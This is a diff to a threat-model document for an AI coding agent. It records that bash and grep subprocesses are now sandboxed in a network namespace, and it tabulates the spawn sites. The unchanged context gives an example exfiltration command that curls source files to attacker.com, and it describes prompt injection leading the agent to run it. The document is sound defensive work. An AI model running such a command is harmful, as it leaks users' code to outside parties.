@@ -61,13 +61,15 @@ through the bash tool, so bash network controls cover git as well.
 
 ## Known Gaps
 
-### 1. Bash tool has unrestricted network access (HIGH)
+### 1. Bash tool has unrestricted network access (HIGH) — ADDRESSED
 
 `bash.ts` spawns commands with full container networking. An AI instructed (via prompt
 injection or otherwise) to run `curl https://attacker.com -d "$(cat /workspace/src/*.ts)"`
 can exfiltrate data regardless of `mode: internal-only`.
 
-**Planned fix**: wrap bash subprocess in a network namespace (see Planned Work below).
+**Fix implemented**: `OPENCODE_SPAWN_SANDBOX=1` (baked into `Dockerfile.analysis`) wraps
+bash subprocesses in a network namespace via bwrap/unshare. `Process.spawn` (used by grep,
+ripgrep) also sandboxed via `sandboxedCmd()` in `util/process.ts`.
 
 ### 2. Prompt injection via webfetch/websearch response content (MEDIUM)
 
@@ -135,10 +137,10 @@ Current subprocess spawn sites and their coverage:
 
 | Spawn site | Uses Process.spawn? | Notes |
 |---|---|---|
-| `bash.ts` | No — direct `child_process.spawn` | Primary risk; needs sandbox |
-| `tool/grep.ts` | Yes | Covered by Process.spawn patch |
-| `file/ripgrep.ts` | Yes | Covered by Process.spawn patch |
-| `lsp/server.ts` | No — direct `child_process.spawn` | LSP needs no network; sandbox is safe |
+| `bash.ts` | No — direct `child_process.spawn` | **Sandboxed inline** via `sandboxedArgs()` |
+| `tool/grep.ts` | Yes | Covered by `Process.spawn` → `sandboxedCmd()` |
+| `file/ripgrep.ts` | Yes | Covered by `Process.spawn` → `sandboxedCmd()` |
+| `lsp/server.ts` | No — direct `child_process.spawn` | LSP needs no network; sandbox is safe to add later |
 | `pty/index.ts` | No — bun-pty | Interactive TUI terminal; not AI-controlled |
 | `session/prompt.ts` | No — direct `child_process.spawn` | Shell for prompt expansion; no user commands |
 
